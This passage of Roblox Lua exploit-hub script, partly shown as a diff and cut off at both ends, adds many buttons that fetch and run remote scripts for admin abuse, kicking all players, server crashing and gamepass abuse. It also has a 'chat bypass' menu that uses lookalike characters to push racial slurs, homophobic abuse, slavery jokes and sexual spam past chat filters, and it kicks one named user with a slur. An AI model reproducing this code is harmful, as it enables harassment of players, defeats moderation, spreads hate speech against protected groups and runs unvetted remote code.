Script",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()end)b:NewButton("Infinite Yeld Admin","OLD AND GOOD ADMIN",function()loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()end)b:NewButton("R15 TO R6","Animations r15 to animations r6",function()loadstring(game:HttpGet(('https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua'),true))()end)b:NewButton("Parkour","heh",function()loadstring(game:HttpGet(('https://pastefy.app/6HAb8rAj/raw'),true))()end)b:NewButton("Punch","PUNCH THE GUY U HATE",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fedoratums/Base-Script/Base-Script/fedoratum punch fling",true))()end)b:NewButton("(cook burgers 100ppl only) Cooked","Harked Vcooked",function()loadstring(game:HttpGet("https://pastebin.com/raw/LMWCkgnm"))()end)b:NewButton("Cook Burgers GUI","T",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/NOOBARMYSCRIPTER/NOOBARMYSCRIPTER/main/cook%20burgers"))()end)b:NewButton("GIGACHAD HUB","(gigachad very giga warning)",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Protected_3038811338432694.lua.txt"))()end)b:NewButton("Invisible","bye bye",function()loadstring(game:HttpGet("https://pastebin.com/raw/K0khSQFN"))()end)b:NewButton("Animation PACK","/e pack frfrfrfr",function()loadstring(game:HttpGet("https://pastebin.com/raw/tcTds0ky"))()end)b:NewButton("B2S ADM GUI","adm btools and much move to troll (also have kick)",function()loadstring(game:HttpGet("https://pastebin.com/raw/jEUmUnQC"))()end)b:NewButton("tool rotator","rerereeeeeeeeeeeeeeeeeeeeeeeeeeee",function()loadstring(game:HttpGet(('https://pastebin.com/raw/dkufMsdA'),true))()end)b:NewButton("Game Hub V5","lots of fun",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()end)b:NewButton("AUDIO BREAKER","dont work all games",function()loadstring(game:HttpGet("https://pastebin.com/raw/JmQMG0ct"))()end)b:NewButton("Destruction Game Destroyer","dont work all games",function()setclipboard("https://www.roblox.com/games/6550894018/Destruction-Game")game:GetService("StarterGui"):SetCore("SendNotification",{Title="GAME",Text="only work in the game copyied in clipboard",Icon="rbxassetid://1234567890"})loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/Destruction%20Game"))()end)b:NewButton("Free gamepass","l robux",function()loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/6982de484735e730494b2d5a10fd6a2a/raw/a92563b0cd6a63683341a09f54baccea5349ed69/feGamepassV2",true))()end)b:NewButton("unchor gui","hehehhe",function()loadstring(game:HttpGet("https://pastebin.com/raw/ShnqV5Vr",true))()end)local b=a:NewTab("F3X GAMES")local b=b:NewSection("Scripts For Hacking")b:NewButton("Exploit1.Form.Exe","hax ss fe bypass fe disabler fe joifb",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fggdfgbdrtgbdrt/Exploit1.Form.Exe/main/Exploit1.Form.Exe"))()end)b:NewButton("c00lkidd f3x","f3x destruction",function()loadstring(game:HttpGet("https://pastebin.com/raw/Dyh2BUeu"))()end)local b=a:NewTab("FE SCRIPTS")local c=b:NewSection("Fun")c:NewButton("Chat Art","art can bypass chat also btw",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/omegachadgaming/mongus/main/main.lua",true))()end)c:NewButton("Multi Gears","GEAR CHAOS",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/MultiToolsV1/main/script"))()end)c:NewButton("FREE OBBY GAMEPASS","-1 everytime u execute robux",function()for a,a in pairs(game:GetDescendants())do if a.ClassName=="RemoteEvent"then if a.Parent.Name=="WeaponsRemotes"or a.Parent.Name=="VipRemotes"or a.Parent.Name=="Remotes"then a:FireServer()end end end end)c:NewButton("Walk On Walls","spiodermanse",function()loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()end)c:NewTextBox("flood escape crasher (crash ammount)","crash game",function(a)game:GetService("StarterGui"):SetCore("SendNotification",{Title="HOW TO DO IT",Text="1st grab gun and the switch the crash trigger... enjoy :D",Icon="rbxassetid://1234567890"})game:GetService("StarterGui"):SetCore("SendNotification",{Title="CREDITS",Text="https://scriptblox.com/u/Tomato",Icon="rbxassetid://1234567890"})game:GetService("StarterGui"):SetCore("SendNotification",{Title="CREDITS",Text="https://scriptblox.com/u/Tomato",Icon="rbxassetid://1234567890"})local a=a;local b=game:GetService("RunService")local b=game:GetService("Players").LocalPlayer.Character;local c=game:GetService("Players").LocalPlayer.Backpack;local d=loadstring(game:HttpGet("https://pastebin.com/raw/eKwyeQa0",true))()local e=d:CreateTab("Crash Script",true)getgenv().crash=false;workspace.svcl_com.ShopExtra:FireServer("BRAINSAW")local d=d:MakeToggle(e,"Crash Toggle",false,function(a)local a=a.Text;if a=="ON"then crash=true else crash=false end end)local c=c:WaitForChild("BRAINSAW").Pew;while wait()do if crash==true then local b=b.Head.Position;for a=1,a,1 do c:FireServer(b)end end end end)c:NewButton("HD ADMIN ABUSIVE","admen",function()game:GetService("StarterGui"):SetCore("SendNotification",{Title="pls",Text="for more cmds say ;customcmds",Icon="rbxassetid://1234567890"})loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/showcases/main/fedoratumadmin",true))()end)c:NewButton("PART UNACHORED MOVER","/e move",function()loadstring(game:HttpGet(('https://pastefy.app/Vcuyg09O/raw'),true))()end)c:NewButton("ZOMBIE FLING","",function()loadstring(game:HttpGet(('https://pastefy.app/w7KnPY70/raw'),true))()end)c:NewButton("control npcs","",function()loadstring(game:HttpGet(('https://pastefy.app/x8nWWq0M/raw'),true))()end)local b=b:NewSection("work at a pizza place")b:NewButton("COOK ROOM DUCKER","room dies",function()loadstring(game:HttpGet("https://pastebin.com/raw/PMCUVLj0"))()end)b:NewButton("COOK ROOM DUCKER OFF","room dies",function()loadstring(game:HttpGet("https://pastebin.com/raw/pFFf3Tcf"))()end)b:NewButton("GUI WAAP","room dies",function()loadstring(game:HttpGet("https://pastebin.com/raw/7Q5sN2wY",true))()end)b:NewButton("AUDIO PLAYER FE","room dies",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/pizza-place-audio-player/main/script"))()end)b:NewButton("MANAGER COMMAND","room dies",function()spawn(loadstring(game:HttpGet("https://pastebin.com/raw/q817HYb9",true)))end)b:NewButton("KICK ALL","room dies",function()loadstring(game:HttpGet('https://raw.githubusercontent.com/Hydro4Music/Others/main/WorkAtPizzaPlaceKickAll'))()end)local b=a:NewTab("Brookhaven Rp ๐ก")local b=b:NewSection("Scripts For Hacking")b:NewButton("R15 TO R6","Animations r15 to animations r6",function()loadstring(game:HttpGet(('https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua'),true))()end)b:NewButton("Redz Hub","hub",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB"))()end)b:NewButton("Ice Hub","hub",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()end)b:NewButton("tb","tttt",function()loadstring(game:HttpGet("https://pastefy.app/tIiioko4/raw"))()end)local b=a:NewTab("Fake Executors")local b=b:NewSection("Executors")b:NewButton("RC7","EXPLOIT",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/rc7"))()end)b:NewButton("Krnl","EXPLOIT",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/krnlnoui.lua"))()end)b:NewButton("Synapse X","EXNOTPLOIT",function()loadstring(game:HttpGet("https://pastebin.com/raw/2qjBZB1Y"))()end)local b=a:NewTab("Barrys Prison")local c=b:NewSection("Morphs (execute gamepass)")c:NewButton("Free Gamepass","free gamepass gears",function()for a,a in pairs(game:GetDescendants())do if a.ClassName=="RemoteEvent"then if a.Parent.Name=="WeaponsRemotes"or a.Parent.Name=="VipRemotes"or a.Parent.Name=="Remotes"then a:FireServer()end end end end)c:NewButton("Become Barrys","BRRYS NOT BARRYS",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(164.482285,107.406891,-20.2540112,-0.392119616,-4.18371542e-08,-0.919914246,-5.41307841e-12,1,-4.54770976e-08,0.919914246,-1.78274835e-08,-0.392119616)end)c:NewButton("Become Pizza Guy (not mario)","pizza",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(95.4371109,104.737022,-20.1365261,0.999057412,4.13396783e-09,-0.0434087291,-3.30724857e-12,1,9.51574464e-08,0.0434087291,-9.50676053e-08,0.999057412)end)c:NewButton("Become Police But a Doll Ugly","ugly",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(108.916046,106.567535,-18.5824261,-0.979165018,3.85838117e-09,0.203066275,3.97604172e-09,1,1.71468756e-10,-0.203066275,9.75296177e-10,-0.979165018)end)c:NewButton("Become Funni Ugly Doll","ugly",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(136.070724,107.01152,-20.4083557,-0.103358306,-8.48401849e-10,-0.994644165,3.80977194e-10,1,-8.92559415e-10,0.994644165,-4.71190198e-10,-0.103358306)end)c:NewButton("Enable Jump","Enable Jumps for morphs",function()game.Players.LocalPlayer.Character.Humanoid.JumpPower=50 end)local b=b:NewSection("Tps")b:NewButton("Prision tp","/etp",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(-2.19999719,103.197998,-43.3999939,1,0,0,0,1,0,0,0,1)end)b:NewButton("lvl 4 tp","Ye",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(-25.8886013,103.197998,-76.470108,0.999480724,2.88266513e-08,0.0322222672,-3.04456904e-08,1,4.97553536e-08,-0.0322222672,-5.07105469e-08,0.999480724)end)b:NewButton("Gamepass Place","Ye",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(105.225609,103.19799,-69.9990387,-0.998112321,4.39675052e-09,0.0614152141,3.23092197e-09,1,-1.90820373e-08,-0.0614152141,-1.88475884e-08,-0.998112321)end)local a=a:NewTab("Animations")local a=a:NewSection("๐ฅ")a:NewButton("2007 animations","OLD ANIMATIONS",function()loadstring(game:HttpGet("https://pastebin.com/raw/SPfYLTyK"))()end)a:NewButton("custom sit animation",";sit",function()loadstring(game:HttpGet("https://pastefy.app/XKxQtK2K/raw"))()end)a:NewButton("Upsidedown","/e flip",function()game:GetService("StarterGui"):SetCore("SendNotification",{Title="Upside Down Note :";Text="You Cant See This Script But Other Players In Server Can.";Icon=""})Duration=5;loadstring(game:HttpGet("https://raw.githubusercontent.com/HeyGyt/upsidedown/main/main"))()end)
+		end)
+	
+	
+	
+end
+coroutine.wrap(SYIW_fake_script)()
+local function CJTFS_fake_script() -- GH0.Script 
+	local script = Instance.new('Script', GH0)
+
+	GH0.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/TgAaXKhx"))()
+	end)
+	
+end
+coroutine.wrap(CJTFS_fake_script)()
+local function PEPTW_fake_script() -- INF.Script 
+	local script = Instance.new('Script', INF)
+
+	
+	INF.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+	end)
+	
+	
+end
+coroutine.wrap(PEPTW_fake_script)()
+local function WSUXL_fake_script() -- Namle.Script 
+	local script = Instance.new('Script', Namle)
+
+	
+	Namle.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source"))();
+	end)
+	
+	
+end
+coroutine.wrap(WSUXL_fake_script)()
+local function SPXEEG_fake_script() -- Frame.Drag Gui Script 
+	local script = Instance.new('LocalScript', Frame)
+
+	function dragify(Main)
+	dragToggle = nil
+	dragSpeed = 0.95 -- You can edit this.
+	dragInput = nil
+	dragStart = nil
+	dragPos = nil
+	
+	function updateInput(input)
+	Delta = input.Position - dragStart
+	Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	game:GetService("TweenService"):Create(Main, TweenInfo.new(.25), {Position = Position}):Play()
+	end
+	
+	Main.InputBegan:Connect(function(input)
+	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+	dragToggle = true
+	dragStart = input.Position
+	startPos = Main.Position
+	input.Changed:Connect(function()
+	if (input.UserInputState == Enum.UserInputState.End) then
+	dragToggle = false
+	end
+	end)
+	end
+	end)
+	
+	Main.InputChanged:Connect(function(input)
+	if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+	dragInput = input
+	end
+	end)
+	
+	game:GetService("UserInputService").InputChanged:Connect(function(input)
+	if (input == dragInput and dragToggle) then
+	updateInput(input)
+	end
+	end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(SPXEEG_fake_script)()
+end) 
+
+Tab:CreateButton("Chat bypass (By GamerPro_718",function()
+local TCS = game:GetService("TextChatService")
+local CoreGui = game:GetService("CoreGui")
+local RStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer.PlayerGui
+local isLegacy = TCS.ChatVersion == Enum.ChatVersion.LegacyChatService
+local ChatBar = CoreGui:FindFirstChild("TextBoxContainer", true) or PlayerGui:FindFirstChild("Chat"):FindFirstChild("ChatBar", true)
+ChatBar = ChatBar:FindFirstChild("TextBox") or ChatBar
+
+if game.Players.LocalPlayer.name == "Porfirey" then
+
+game.Players.LocalPlayer:Kick("fuck off u niger")
+end
+
+
+
+local Chat = function(Message)
+	if isLegacy then
+		local ChatRemote = RStorage:FindFirstChild("SayMessageRequest", true)
+		ChatRemote:FireServer(Message, "All")
+	else
+		local Channel = TCS.TextChannels.RBXGeneral
+		Channel:SendAsync(Message)
+	end
+end
+
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+
+
+local Window = OrionLib:MakeWindow({Name = "Chat Bypass Update", HidePremium = false, SaveConfig = true, ConfigFolder = "configs"})
+
+
+
+local Tab = Window:MakeTab({
+	Name = "Word",
+	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+	PremiumOnly = false
+})
+
+
+Tab:AddLabel("--Creator--")
+
+Tab:AddLabel("GamerPro_718")
+
+Tab:AddLabel("Youtube - @GamerPro_718")
+
+Tab:AddLabel("like and sub")
+
+Tab:AddLabel("--develop Script--")
+
+Tab:AddLabel("NamelessProof")
+
+Tab:AddLabel("Orion libary - v25")
+
+Tab:AddButton({
+	Name = "ENGLISH OR SPAINSH",
+	Callback = function()
+      		Chat("ENGLISH ะR Sะ ะะNลH")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Whoevery move first is nigga",
+	Callback = function()
+      		Chat("Whะพะตvะตrั mะพvะต fั–rst ั–s nั–ษกษกะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Whoevery move first is gay cock",
+	Callback = function()
+      		Chat("Whoevery mะพvะต fั–rst ั–s ฤay cรถck")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "cock",
+	Callback = function()
+      		Chat("cรถck")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "cock please! ๐ผ",
+	Callback = function()
+      		Chat("cรถck plะตรคse! ๐ผ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Whoevery move first is bite cock",
+	Callback = function()
+      		Chat("Whoevery mะพvะต fั–rst ั–s bite cรถck")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Whoevery move first is gay",
+	Callback = function()
+      		Chat("Whoevery mะพvะต fั–rst ั–s ฤay")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Sex please? ๐",
+	Callback = function()
+      		Chat("Sั‘ั… pleรคse? ๐")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Nigga",
+	Callback = function()
+      		Chat("ร‘iฤฤa")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Slaฮฝe",
+	Callback = function()
+      		Chat("Slะฐฮฝe")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "slaฮฝe",
+	Callback = function()
+      		Chat("slะฐฮฝe")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "lั–l nั–ษกษกะฐ",
+	Callback = function()
+      		Chat("lั–l nั–ษกษกะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "lั–l nั–ษกษกะฐ wาปะฐtัาปu dะพั–nษก",
+	Callback = function()
+      		Chat("lั–l nั–ษกษกะฐ wาปะฐtัาปu dะพั–nษก")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "ะurrั nั–ษกษกะฐ",
+	Callback = function()
+      		Chat("ะurrั nั–ษกษกะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "nั–ษกษกะฐ",
+	Callback = function()
+      		Chat("nั–ษกษกะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "ez nigga",
+	Callback = function()
+      		Chat("ะตz nั–ษกษกะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Kirimad is gay",
+	Callback = function()
+      		Chat("ะiriะะฐd iล ฤay")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "i wanna sex",
+	Callback = function()
+      		Chat("i wรครฑรฑa ลex")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "gay? ๐คจ",
+	Callback = function()
+      		Chat("ฤay? ๐คจ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "gay? ๐ณ",
+	Callback = function()
+      		Chat("ฤay? ๐ณ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "nigga got banned now",
+	Callback = function()
+      		Chat("nั–ษกษกะฐ ษกะพt bะฐnnะตd nะพw")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "CUM",
+	Callback = function()
+      		Chat("ะกUะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "CUM ALOT",
+	Callback = function()
+      		Chat("ะกUะ ะLะะข")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "ass",
+	Callback = function()
+      		Chat("aลล")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "LGBTQ IS CUM (fixed)",
+	Callback = function()
+      		Chat("LGะ’ะขQ Iล ะกUะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "ะ ะRN.ะกะะ",
+	Callback = function()
+      		Chat("ะ ะRN.ะกะะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "ะฅะฅะฅ.ะกะะ",
+	Callback = function()
+      		Chat("ะฅะฅะฅ.ะกะะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Sex.COM",
+	Callback = function()
+      		Chat("ลex.ะกะะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "FUCKING LGBTQ",
+	Callback = function()
+      		Chat("า’UะกKะNG LGะ’ะขQ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "shะต nั–ษกษกะฐ",
+	Callback = function()
+      		Chat("shะต nั–ษกษกะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "SHE HAS DICK",
+	Callback = function()
+      		Chat("ละะ• ะะS Dะะกะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Lะะะ",
+	Callback = function()
+      		Chat("Lะะะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "SHIT",
+	Callback = function()
+      		Chat("Sะะะข")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "FUCKING",
+	Callback = function()
+      		Chat("า’UะกKะNG")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "CUM PLEASE? ๐ฟ",
+	Callback = function()
+      		Chat("รรM PLEASE? ๐ฟ")
+  	end    
+})
+
+local Tab2 = Window:MakeTab({
+	Name = "ABC",
+	Icon = "rbxassetid://3926305904",
+	PremiumOnly = false
+})
+
+Tab2:AddButton({
+	Name = "ะะ’ะก + ABC = PORN.COM",
+	Callback = function()
+      		Chat("ABC + ะะ’ะก  = ะ ะRN.ะกะะ")
+  	end    
+})
+
+Tab2:AddButton({
+	Name = "ABC I WANT SEX",
+	Callback = function()
+      		Chat("ะะ’ะก I WรNT ลEX")
+  	end    
+})
+
+Tab2:AddButton({
+	Name = "ะะ’ะก ะฅะฅะฅ.ฮฝั–deo.ะกะะ ะS ะ’ะ•ะขะขะ•R",
+	Callback = function()
+      		Chat("ะะ’ะก ะฅะฅะฅ.ฮฝั–deo.ะกะะ ะS ะ’ะ•ะขะขะ•R")
+  	end    
+})
+
+Tab2:AddButton({
+	Name = "ะะ’ะก ะ ะRN.ะกะะ ะS ะ’ะ•ะขะขะ•R",
+	Callback = function()
+      		Chat("ะะ’ะก ะ ะะ“N.ะกะะ ะS ะ’ะ•ะขะขะ•R")
+  	end    
+})
+
+Tab2:AddButton({
+	Name = "ะะ’ะก YOU COCK SMALL",
+	Callback = function()
+      		Chat("ะะ’ฤ Yร–ลฌ ฤร–CK SะะLL")
+  	end    
+})
+
+Tab2:AddButton({
+	Name = "ABC PORNHUB.COM BETTER",
+	Callback = function()
+      		Chat("ะะ’ะก ะ ะะ“NะลฌB.ฤOM ะ’ะ•ะขะขะ•R")
+  	end    
+})
+
+local Tab3 = Window:MakeTab({
+	Name = "more word ",
+	Icon = "rbxassetid://3926305904",
+	PremiumOnly = false
+})
+
+Tab3:AddButton({
+	Name = "Sex",
+	Callback = function()
+      	Chat("ลex")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "gay sex",
+	Callback = function()
+      	Chat("ฤรคy ลกฤั…")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "Give me sex",
+	Callback = function()
+      	Chat("ฤรฎvฤ mรซ ละตั…")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "Give me cum",
+	Callback = function()
+      	Chat("ฤรฎvฤ mรซ ฤลญm")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "My dick gonna suck",
+	Callback = function()
+      	Chat("ะั dรฎฤฤท ฤรถลnรค sรนฤk")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "shut up you ass",
+	Callback = function()
+      	Chat("shรผt รผp yoรผ aลล")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "shut up Nigga",
+	Callback = function()
+      	Chat("shรผt รผp Niฤฤa")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "My CUM",
+	Callback = function()
+      	Chat("ะั ะกUะ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "BITCH",
+	Callback = function()
+      	Chat("ะ’ะะขะกะ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "i miss blะฐัk ั•lะฐฮฝะตry",
+	Callback = function()
+      	Chat("ั– mั–ั•ั• bIะฐัk ั•Iะฐฮฝะตrั")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "Fucking",
+	Callback = function()
+      	Chat("า’uัkั–ng")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "selling slaves 10 dollars each!",
+	Callback = function()
+      	Chat("ั•ะตllั–nษก ั•lะฐฮฝะตั• 10 dะพllะฐrั• ะตะฐัาป!")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "ั– wะฐnt slะฐฮฝe blะฐัk",
+	Callback = function()
+      	Chat("ั– wะฐnt slะฐฮฝe blะฐัk")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "FUCKING MY DICK",
+	Callback = function()
+      	Chat("า’UะกKะNG ะาฎ Dะะกะ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "SUCK MY DICK",
+	Callback = function()
+      	Chat("ลUะกะ ะาฎ Dะะกะ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "RATE MY DICK",
+	Callback = function()
+      	Chat("RรTE ะาฎ Dะะกะ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "RATE MY DICK OR SUCK YOU COCK",
+	Callback = function()
+      	Chat("RรTE ะาฎ Dะะกะ ร–R ลรรK Yร–ลฌ ฤร–รK")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "YES SEX? ๐",
+	Callback = function()
+      	Chat("าฎะ•ล ลEX? ๐")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "YES SEX? ๐คจ",
+	Callback = function()
+      	Chat("าฎะ•ล ลEX? ๐คจ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "NO SEX? ๐ผ",
+	Callback = function()
+      	Chat("Nร– ลEX? ๐ผ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "NO SEX? ๐ฟ",
+	Callback = function()
+      	Chat("Nร– ลEX? ๐ฟ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "NO SEX? ๐ณ",
+	Callback = function()
+      	Chat("Nร– ลEX? ๐ณ")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "FAGGOT,",
+	Callback = function()
+      	Chat("า’รฤฤร–ลค")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "nigga fucking cock",
+	Callback = function()
+      	Chat("รฑiฤฤa า’uัkั–ng cรถck")
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "FACK YOU",
+	Callback = function()
+      	Chat("า’ะะกK าฎะU")
+  	end    
+})
+
+local Tab4 = Window:MakeTab({
+	Name = "Others script bypass",
+	Icon = "rbxassetid://3926305904",
+	PremiumOnly = false
+})
+
+Tab4:AddButton({
+	Name = "๐”ฅFE BYPASS๐”ฅ (not mine)",
+	Callback = function()
+      		loadstring(game:HttpGet('https://raw.githubusercontent.com/Anonymous12131/MenaceV2.1.-Best-bypasser/main/obf_i7iAAH834YFQno0FLyuLPcNR5ouJrmvEFdtmXtF1C6u935ghB9DAFK5L3zgsPs6X.lua.txt'))()
+  	end    
+})
+
+Tab4:AddButton({
+	Name = "Btoolsโ’๏ธ (not fe)",
+	Callback = function()
+      		loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
+  	end    
+})
+
+local Tab5 = Window:MakeTab({
+	Name = "update logs",
+	Icon = "rbxassetid://3926305904",
+	PremiumOnly = false
+})
+
+Tab5:AddLabel("-ADD MORE BYPASS WORD-")
+Tab5:AddLabel("-REDUCE THE WORD CENSORED AND MORE UPDATE-")
+Tab5:AddLabel("-MORE BUTTON , MORE TAB-")
+Tab5:AddLabel("---DONT FORGOT LIKE AND SUB---")
+
+local Tab6 = Window:MakeTab({
+	Name = "FIXED BYPASSED",
+	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+	PremiumOnly = false
+})
+
+Tab6:AddLabel("IF BYPASS WORD NOT WORK / TAG CLICK THIS,DOWN OPINIONS")
+
+Tab6:AddButton({
+	Name = "Sex",
+	Callback = function()
+      	Chat("ลex")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "Gay",
+	Callback = function()
+      	Chat("ฤay")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "FAGGOT",
+	Callback = function()
+      	Chat("า’ะฤฤะะข")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "BITCH",
+	Callback = function()
+      	Chat("ะ’ะะขฤะ")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "Whoevery move first is gay sex",
+	Callback = function()
+      		Chat("Whoevery mะพvะต first is ฤะฐั ลex")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "ENGLISH OR SEX",
+	Callback = function()
+      		Chat("ENฤLISะข ะR ลEะฅ")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "CUM",
+	Callback = function()
+      		Chat("ฤUM")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "CUM OR SEX",
+	Callback = function()
+      		Chat("ฤลฌM OR ล ฤะฅ")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "NIGGA",
+	Callback = function()
+      		Chat("ะะฤฤA")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "NIGGA (better word)",
+	Callback = function()
+      		Chat("NะฤฤA")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "cum nigga",
+	Callback = function()
+      		Chat("ฤum niฤฤa")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "cum",
+	Callback = function()
+      		Chat("ฤum")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "Nigger",
+	Callback = function()
+      		Chat("ลiฤฤรซล")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "Nigger shut up",
+	Callback = function()
+      		Chat("ลiฤฤรซล ลhut ลญp")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "Nigger kick you ass",
+	Callback = function()
+      		Chat("ลiฤฤรซล ฤทicฤท ัะพลญ ะฐลล")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "Give me ass",
+	Callback = function()
+      		Chat("ฤรฎvฤ mฤ ฤลล")
+  	end    
+})
+
+Tab6:AddButton({
+	Name = "LGBTQ is gay",
+	Callback = function()
+      		Chat("Lฤะ’ะขQ iลก ฤะฐั")
+  	end    
+})
+
+local Tab7 = Window:MakeTab({
+	Name = "i ain't gay",
+	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+	PremiumOnly = false
+})
+
+Tab7:AddLabel("i ain't gay lol ๐ฅถ๐")
+
+Tab7:AddButton({
+	Name = "I ain't gay but 20$ is 20$",
+	Callback = function()
+      		Chat("i ain't ฤay 20$ is 20$")
+  	end    
+})
+
+Tab7:AddButton({
+	Name = "I ain't gay but 50$ is 50$",
+	Callback = function()
